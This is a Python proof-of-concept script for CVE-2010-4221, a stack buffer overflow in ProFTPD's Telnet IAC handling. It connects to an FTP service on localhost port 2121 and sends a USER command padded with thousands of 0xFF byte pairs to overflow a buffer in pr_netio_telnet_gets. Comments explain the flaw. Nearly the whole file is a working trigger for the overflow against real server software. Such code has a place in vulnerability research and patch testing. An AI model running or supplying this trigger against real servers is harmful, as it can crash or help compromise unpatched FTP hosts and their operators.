#!/usr/bin/env python3
"""
PoC: CVE-2010-4221 - ProFTPD Telnet IAC Stack Buffer Overflow
Trigger: Send many Telnet IAC (0xFF) bytes to overflow stack buffer in pr_netio_telnet_gets
The vulnerability is in how pr_netio_telnet_gets handles IAC escape sequences
"""

import socket

s = socket.socket()
s.connect(("localhost", 2121))
s.recv(1024)  # banner

# CVE-2010-4221: pr_netio_telnet_gets() has a 1024-byte buffer
# When it encounters IAC (0xFF) it writes 0xFF to buffer and decrements buflen
# but doesn't check if buflen went negative before continuing
# Sending alternating IAC bytes causes the buffer pointer to advance past buffer end

# Send data with many IAC sequences - each IAC byte causes special processing
# Pattern: IAC followed by another byte (IAC IAC means literal 0xFF)
payload = b"USER "
# Add many IAC IAC sequences (each pair = one 0xFF in buffer)
for _ in range(2048):
    payload += b"\xff\xff"  # IAC IAC = literal 0xFF
payload += b"\r\n"

s.send(payload)
try:
    s.recv(1024)
except:
    pass
s.close()
